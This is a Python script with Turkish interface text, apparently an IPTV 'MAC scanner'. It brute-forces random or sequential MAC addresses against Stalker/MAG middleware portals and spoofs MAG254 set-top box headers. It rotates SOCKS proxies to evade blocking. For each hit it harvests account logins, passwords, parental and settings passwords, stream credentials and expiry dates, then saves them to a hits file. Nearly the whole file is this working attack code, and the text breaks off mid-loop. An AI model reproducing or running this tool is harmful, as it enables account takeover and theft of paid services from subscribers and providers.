import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
import pathlib
subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

subprocess.run(["clear", ""])

oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses= requests.Session()
logging.captureWarnings(True)

say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
prox=0
cpm=1


macSayisi=999999999999991# 1#deneme sayisı
Tsubasa007=("""
\33[32m▰▰▰▰ᴘʏᴛʜᴏɴ 🅑🅛🅤🅔-🅦🅗🅘🅣🅔 -ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
╔══════════════════════════════════        
            TSUBASA       
╚══════════════════════════════════                   
\33[32m▰▰▰▰ 🅑🅛🅤🅔-🅦🅗🅘🅣🅔 ᴘʏ ᴄᴏɴғɪɢ ▰▰▰▰             \33[0m""")
print(Tsubasa007) 
pattern= "(00:\w{2}:79:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='@Tsubasa007'

subprocess.run(["clear", ""])
print(Tsubasa007) 
panel = input("""
Request değiştirmek için 1 yazın...

Örnek PanelAdı:Port = iptvturkiye.xyz:8080\n
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
uzmanm="server/load.php"
if panel=="1":
    
    uzmanm=input("""
\33[0mRequests linkini değiştirmek için

	1=portal.php
	2=server/load.php
	3=stalker_portal
	4=xUi /c/
	5=bs.mag.portal
	6=Kendim beliryecem
	
    	Cevap=""")
    if uzmanm=="6":
    	uzmanm=input("Cevap=")
    if  uzmanm=="1":
    	uzmanm="portal.php"
    if uzmanm=="" or uzmanm=="2":
    	uzmanm="server/load.php"
    if uzmanm=="3":
    	uzmanm="stalker_portal/server/load.php"
    if uzmanm=="4":
    	uzmanm="c/server/load.php"
    if uzmanm=="5":
    	uzmanm="bs.mag.portal.php"
    subprocess.run(["clear", ""])
    print(Tsubasa007) 
    panel = input("""
Örnek PanelAdı:Port = iptvturkiye.xyz:8080\n
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#print(panel.split('/')[3])
try:
	if panel.split('/')[3] =='stalker_portal':
		uzmanm="stalker_portal/server/load.php"
		panel=panel.replace('/stalker_portal','')
except:pass
#	print(panel)#http://z.zcatt.cc/stalker_portal/c/

kanalkata="0"
kanalkata=input("""
Kanal Kategorileri imzaya dahil edilsin mi?
	0= Ekleme
	1= Sadece Ulke Kanal kategorisi
	2= Hepsini ekle (Live-VOD SERI)
\33[1mCevab Girin=""")



subprocess.run(["clear", ""])
print(Tsubasa007) 

combo=input("""
	Tarama türünü seçiniz..!
1= Combolu
2 = Otomatik Combosuz

 Cevap=""" )
subprocess.run(["clear", ""])
print(Tsubasa007) 
totLen="000000"
if combo=="1":
 	say=0
 	dsy=""
 	dir='/sdcard/combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"-) "+files+'\n'
 	print ("""Aşağıdaki listeden combonuzu seçin!!!
"""+dsy+"""
\33[33mCombo klasörünüzde """ +str(say)+""" adet dosya bulundu !
	""")
 	dsyno=str(input(" \33[31mCombo No =\33[0m"))
 	say=0
 	for files in os.listdir (dir):
 			say=say+1
 			if dsyno==str(say):
 				dosyaa=(dir+files)
 	say=0
 	print(dosyaa) 
 	c=open(dosyaa, 'r')
 	
 	totLen=c.readlines()
 	subprocess.run(["clear", ""])
 	print(Tsubasa007) 
 	print("Combonuzdaki mac yetersiz kaldığında taramaya devam edebilmesi için")
macturu=input("""
\33[1mMac kombinasyonu türünü seçin...?\33[0m
\33[33mArdışık artan mac için = \33[31m1
\33[33mRandom rasgele için   = \33[31m2

\33[0m\33[1mMac Kombinasyon Türü=\33[31m""")
if macturu=="":
	macturu="2"
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"

Macs = input("""\33[0m
Çalışan mac Testi için 5 yazın...
Mac türünü değiştirmek için 0 yazınız...

\33[33mSeri Mac Kullanılsın mı?
\33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! 

Cevap=""") 
if Macs=="5":
	macSayisi=1#int(input("Denecek mac sayısı =")) 
	ozelmac=input("Özel çalışan mac =")
dmac=""
if  Macs=="0":
	dmac=input("""
Default Mac Türü
	1= 00:1A:79:
	2= 10:27:BE:
	3= 33:44:CF
	4= Kendim Beliryeceğim...
	""")
	if dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="2":
		MacCombo="10:27:BE:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="3":
		MacCombo="33:44:CF:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="4":
		MacCombo=input("İlk üç maç türünü yazınız...")
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 


if Macs[:1]=="e" or Macs[:1]=="E"  or Macs=="1":
    Seri=input("Örnek="+MacCombo+"\33[31m5\33[0m\nÖrnek="+MacCombo+"\33[31mFa\33[32m\nBir yada iki değer Yazınız!!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
   # Seri=Seri[:2]
    #MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo
subprocess.run(["clear", ""])
print(Tsubasa007) 
#print(len(Tsubasa007)) 
mm=MacCombo.replace(':',"")
#panel="titan.panel.tm"


if panel=="" :
    exit() 
#if len(mm)==6:
#	turet=6
#	MacCombo=MacCombo+":"
#if len(mm)==7:
#	turet=5
#if len(mm)==8:
#	turet=4
#	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
subprocess.run(["clear", ""])
print(Tsubasa007) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
bad=0
proxies=""
proxi=input("""
	Proxies kullanmak istiyormusunuz..!
1 - Evet
2 - Hayır

1 veya 2 yazınız =""")
subprocess.run(["clear", ""])
print(Tsubasa007) 
if proxi =="1":
	say=0
	dsy=""
	dir='/sdcard/download/'
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""
	Aşağıdaki listeden combonuzu seçin!!!
"""+dsy+"""
\33[33mCombo klasörünüzde """ +str(say)+""" adet dosya bulundu !
Lütfen Proxy Socks5 dosyanızı seçininiz...!
	""")
	dsyno=str(input(" \33[31mCombo No =\33[0m"))
	say=0
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	proxies=""
	print(dosyaa) 
	Proxy=dosyaa
	c=open(Proxy,'r')
	sock=c.readlines()
	prox=0
	Proxy=dosyaa
	subprocess.run(["clear", ""])
	print(Tsubasa007) 
	pro=input("""
Seçtiğiniz dosyadaki proxsy türü nedir?
	1 - ipVanish Socks5
	2 - free Socks4 
	3 - free Socks5
		Proxy türü=""")
subprocess.run(["clear", ""])
print(Tsubasa007) 
DosyaA="/sdcard/" + panel.replace(":","_") +"@Tsubasa007.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(Tsubasa007) 
macaddres=MacCombo
	
for mag in range(16**6):
	oto=""
	macr=""
	tur=0
	hex_num = hex(mag)[2:].zfill(6)
	genmac = MacCombo+"%02x:%02x:%02x"% (random.randint(0, 256),random.randint(0, 256),random.randint(0, 256))
	genmac=genmac.replace(':100',':10')
#	print(Seri)
	if len(Seri) ==1:
	   genmac=str(genmac).replace(str(genmac[:10]),macaddres+Seri)
	if len(Seri)==2:
	   genmac=str(genmac).replace(str(genmac[:11]),macaddres+Seri)
	macr=(genmac)
	s=s+1
	if s ==16:
		ss=ss+1
		s=0
	if ss ==16:
		sss=sss+1
		ss=0
		s=0
	if sss==16:
		ssss=ssss+1
		sss=0
		ss=0
		s=0
	if ssss==16:
		sd=sd+1
		ssss=0
		sss=0
		ss=0
		s=0		
	if sd==16:
		sdd=sdd+1
		sd=0
		sss=0
		ss=0
		s=0

	if sdd==16:
		sdd=0
		sd=0
		sss=0
		ss=0
		s=0
	
	seri1=a[sdd]
	seri2=a[sd]
	#print(Seri)
	if not Seri=="":
		if len(Seri)==1:
			seri1=Seri[0]
			
		if len(Seri)==2:
			seri1=Seri[0]
			seri2=Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	#print(maca)
	if macturu =="1":
		mac=mac=MacCombo+maca
	else:
		mac=macr
	
		
		
	
	
	
	#macs=mac.replace(':','%3A')
	#mac=mac.upper()
	combo=combo
	if combo=="1":
		#print(combo)
		if len(totLen)-2 > csay:
			#print(combo)
			while True:
			    # print(csay)
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	#print("######")
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		mac=mac.upper() 
			     		mac=mac.replace('00:1A:79',MacCombo)
			     	break
	
	
	if not ozelmac=="":
		mac=ozelmac
	#mac="00:1A:79:50:2E:30"
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	
	macs=mac.replace(':','%3A')	     

		
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}	
	
	url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	#print(url1)
	token=""
	veri=""
	
	
	if proxi =="1":
			if prox==len(sock)-2:
				prox=0
			#print("evet")
			if pro=="1":
					#print("1")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							#print(prox)
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							pip=pveri.split(':')[0]
							pport=pveri.split(':')[1]
							pname=pveri.split(':')[2]
							ppass=pveri.split(':')[3]
							proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,
							'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
							print('\33[33mSocks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad)+"\33[0m" )
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(req.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
			if pro=="2":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks4://'+pip+':'+pport,
						'https':'socks4://'+pip+':'+pport}
							print('Socks4 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
	
			if pro=="3":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks5://'+pip+':'+pport,
						'https':'socks5://'+pip+':'+pport}
							print('Socks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
		
	
	

	
#	try:
	else:
		bag1=0
		while True:
			try:
				res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag1=bag1+1
				time.sleep(2)
				if bag1==4:
					quit()
		bag1=0
					
		veri=str(res.text)
		
	if 1==1:
            renk="\33[0m"
            if 'token' in veri:
            	token=veri.replace('{"js":{"token":"',"")
            	token=token.split('"')[0]
            	#token=token.replace('"}}',"")
            	#print(token)
            	renk="\33[0m"
            else:
            	renk="\33[41m"
            
            say=say+1
            #print(token)
            total=str(say) 
            cpm=(time.time()-cpm)
            cpm=(round(60/cpm))
            print ("""
╭─➤ \33[0m\33[1;30;107m \33[0m\33[1;44;104m BLUEWHITE \33[1;30;107m 🅟🅨  \33[0m\33[1;100m \33[1;41m 🅿🆁🅾   \33[1;30;107m \33[0m 𝘃3 ✅  
├● \33[96mTotal ➤"""+total+""" \33[31m Hit ➤""" + str(hit)+ """ \33[94m Cpm ➤""" +str(cpm)+"""  
╰──● """ +renk+mac+""" \33[32m""" +panel)
            
            cpm=time.time()
            
            
            HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
            }
            
         
            url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
          
            while True:
            	try:
            		res = ses.get(url2,proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(2)
            		if bag1==4:
            			quit()
            bag1=0
            		
            	
            veri=""
            veri=str(res.text)
            #print(veri)
            #quit()
            ip=""
            fname=""
            stb_id=""
            stb_type=""
            tplan=""
            fname=""
            adult=""
            user=""
            passw=""
            tarrif=""
            if "expire_billing_date" in veri:
            	stb_id=veri.split('id":"')[1]
            	stb_id=stb_id.split('"')[0]
            	
            	stb_type=veri.split('"stb_type":"')[1]
            	stb_type=stb_type.split(',')[0]
            	stb_type=stb_type.replace('"',"")
            	
            	tplan=veri.split('"tariff_plan_id":"')[1]
            	tplan=tplan.split('"')[0]
            	
            	fname=veri.split('"fname":"')[1]
            	fname=fname.split('"')[0]
            	
            	adult=veri.split('parent_password":"')[1]
            	adult=adult.split('"')[0]
            	try:
            		ip=veri.split('ip":"')[1]
            		ip=ip.split('"')[0]
            	except:pass
            	
            	timezon=veri.split('"default_timezone":"')[1]
            	timezon=timezon.split(',')[0]
            	timezon=timezon.replace('"',"")
            	
            	user=veri.split('"login":')[1]
            	user=user.split(',')[0]
            	user=user.replace('"',"")
            	
            	passw=veri.split('","password":"')[1]
            	passw=passw.split(',')[0]
            	passw=passw.replace('"',"")
            	
            	sespas=veri.split('"settings_password":"')[1]
            	sespas=sespas.split(',')[0]
            	sespas=sespas.replace('"',"")
            	
            	sbitis=veri.split('expire_billing_date":')[1]
            	sbitis=sbitis.split(',')[0]
            	sbitis=sbitis.replace('"',"")
            	if sbitis=="null":
            		sbitis="Unlimited"
            		
            if 'play_token' in veri:
            	adult=veri.split('parent_password":"')[1]
            	adult=adult.split('"')[0]
            	play_token=veri.split('play_token":"')[1]
            	play_token=play_token.split('"')[0]
            	acount_id=veri.split('name":"')[1]
            	acount_id=acount_id.split('"')[0]
            	stb_id=veri.split('id":"')[1]
            	stb_id=stb_id.split('"')[0]
            	stb_type=veri.split('"stb_type":"')[1]
            	stb_type=stb_type.split('"')[0]
            	sespas=veri.split('"settings_password":"')[1]
            	sespas=sespas.split('"')[0]
            	stb_c=veri.split('"client_type":"')[1]
            	stb_c=stb_c.split('"')[0]
            	timezon=veri.split('"default_timezone":"')[1]
            	timezon=timezon.split('"')[0]
            	tloca=veri.split('"default_locale":"')[1]
            	tloca=tloca.split('"')[0]
            	if 'ip' in veri:
            		try:
            			ip=veri.split('ip":"')[1]
            			ip=ip.split('"')[0]
            		except:pass
            
            bag1=0
            url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
            while True:
            	try:
            		res = ses.get(url3, proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(2)
            		if bag1==4:
            			quit()
            
            bag1=0
            veri=""
            veri=str(res.text)
            if not veri=="":
            	if not 'js' in veri:
            		url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+macs
            		while True:
            			try:
            				res = ses.get(url3, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
	            			bag1=bag1+1
	            			time.sleep(2)
	            			if bag1==4:
	            			 	quit()
	            	bag1=0
            		veri=str(res.text)
            
            if not veri.count('phone')==0 or not fname=="":
            	hit=hit+1
            	
            	sound="/sdcard/kemik_sesi.mp3"
            	file = pathlib.Path(sound)
            	try:
            		if file.exists ():
            			ad.mediaPlay(sound)
            	except:pass
            	#print(veri)
            	if 'tariff_plan' in veri:
            		tarrif=veri.split('tariff_plan":"')[1]
            		tarrif=tarrif.split('"')[0]

            	
            	if 'end_date' in veri:
            		#print(veri)
            		trh=veri.split('end_date":"')[1]
            		trh=trh.split('"')[0]
            	else:
            		trh=veri.split('phone":"')[1]
            		trh=trh.split('"')[0]
            		if not fname=="":
            			if trh=="":
            				trh=sbitis
            	#print(trh)
            	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
            	SNENC=SN.upper()
            	SNCUT=SNENC[:13]
            	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
            	DEVENC=DEV.upper()
            	SG=SNCUT+'+'+(mac)
            	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
            	SINGENC=SING.upper()
            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
            	kategori="hata"
            	if kanalkata=="1" or kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	            			kategori=kategori+kanal+" ✔️ "
	            			#⚡️✨💫
	            		if '*' in kategori:
	            			kategori=kategori.split("*")[1]
	            		kategori=kategori.replace("\/","/")
	            		kategori=kategori.replace('hata{"js":[{"id":"','')
	            		kategori=kategori.replace('hata{ ','')
            		
            	#print(kategori)
            	url5="http://"+panel+"/"+uzmanm+"?type=vod&action=get_categories&JsHttpRequest=1-xml"
            	kategoriv="hata"
            	if kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	            			kategoriv=kategoriv+kanal+" ✔️ "
	            			#⚡️✨💫
	            		if '*' in kategoriv:
	            			kategoriv=kategoriv.split("*")[1]
	            		kategoriv=kategoriv.replace("\/","/")
	            		kategoriv=kategoriv.replace('hata{"js":[{"id":"','')
	            		kategoriv=kategoriv.replace('hata{ ','')
            	#print(kategori)
            	url5="http://"+panel+"/"+uzmanm+"?type=series&action=get_categories&JsHttpRequest=1-xml"
            	kategoris="hata"
            	if kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	            			kategoris=kategoris+kanal+" ✔️ "
	            			#⚡️✨💫
	            		if '*' in kategoris:
	            			kategoris=kategoris.split("*")[1]
	            		kategoris=kategoris.replace('\/','')
	            		kategoris=kategoris.replace('hata{"js":[{"id":"','')
	            		kategoris=kategoris.replace('hata{ ','')
	            		
            		
            	#print(kategori)            	
            	url5="http://"+panel+"/"+uzmanm+" ?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml"
            	token2="play_token" 
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            				break
            	bag1=0
            	veri=str(res.text)
            	#print(veri)
            	if 'cmd' in veri:
            		token2=veri.split('cmd":"')[1]
            		token2=token2.split('"')[0]
            	#print(token2)
            	real=panel
            	HEADERd={
"Host":panel,            	
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=b01850af81da130f1f4407a96da5b48c" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
            }
            	url5="http://"+real+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
            	userm=user
            	pasdm=passw
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            				break
            	bag1=0
            	veri=str(res.text)
            	#print(veri)
            	try:
            		veri=veri.replace('live\/', '') 
            		real=veri.split('\/')[2]
            		userm=veri.split('\/')[3]
            		pasdm=veri.split(userm+'\/')[1]
            		pasdm=pasdm.split('\/')[0]
            	except:pass
            	#print(userm)
            	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
            }
            	if userm=="hata":
            			url5="http://"+real+"/"+uzmanm+" ?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
            			while True:
            				try:
            					res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            					break
            				except:
            					bag1=bag1+1
            					time.sleep(2)
            					if bag1==4:
            						break
            			bag1=0
            			try:
            				real=veri.split('\/')[2]
            				userm=veri.split('\/')[4]
            				pasdm=veri.split('\/')[5]
            			except:pass
            			
            	realm=real
            	
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	kanalsayisi=str(veri.count("stream_id"))
            	#print(kanalsayisi)
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	filmsayisi=str(veri.count("stream_id"))
            	
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	dizisayisi=str(veri.count("series_id"))
            	if not fname=="":
            		userm=user
            		pasdm=passw
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	#print(veri)
            	acon="" 
            	if 'active_cons' in veri:
            		try:
		            	#print(veri)
		            	acon=""
		            	acon=veri.split('active_cons":')[1]
		            	acon=acon.split(',')[0]
		            	acon=acon.replace('"',"")
		            	
		            	mcon=veri.split('max_connections":')[1]
		            	mcon=mcon.split(',')[0]
		            	mcon=mcon.replace('"',"")
		            	
		            	status=veri.split('status":')[1]
		            	status=status.split(',')[0]
		            	status=status.replace('"',"")
		            	
		            	timezone=veri.split('timezone":"')[1]
		            	timezone=timezone.split('",')[0]
		            	timezone=timezone.replace("\/","/")
		            	
		            	realm=veri.split('url":')[1]
		            	realm=realm.split(',')[0]
		            	realm=realm.replace('"',"")
		            	#print(realm)
		            	portal=panel
		            	port=veri.split('port":')[1]
		            	port=port.split(',')[0]
		            	port=port.replace('"',"")
		            	
		            	user=veri.split('username":')[1]
		            	user=user.split(',')[0]
		            	user=user.replace('"',"")
		            	
		            	passw=veri.split('password":')[1]
		            	passw=passw.split(',')[0]
		            	passw=passw.replace('"',"")
		            	
		            	bitis=veri.split('exp_date":')[1]
		            	bitis=bitis.split(',')[0]
		            	bitis=bitis.replace('"',"")
		            	if bitis=="null":
		            		bitis="Unlimited"
		            	else:
		            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
		            	bitis=bitis
            		except:pass
            	try:
            		pal=panel.split(':')[0]
            		yanpanel1="hata" 
	            	yanpanel="hata" 
	            	url= "http://ipv4info.com/?act=check&ip="+pal
	            	res = ses.get(url, timeout=15, verify=False)
	            	veri=str(res.text)
	            	yan=""
	            	yanlar=veri
	            	yanpanel="hata"
	            	if veri.count("Site info ")>0:
	            	    for i in veri.split('Site info ('):
	            	    	yan=yan+(i.split(')')[0])+" 🌎 "
	            	    	yanpanel=(yan.split('(')[1])
	            	else:
			   		       yan1=veri.split('href="/ip-address')[1]
			   		       yan1=yan1.split('">')[0]
			   		       url="http://ipv4info.com/ip-address"+yan1
			   		       res = ses.get(url, timeout=15, verify=False)
			   		       veri=str(res.text)
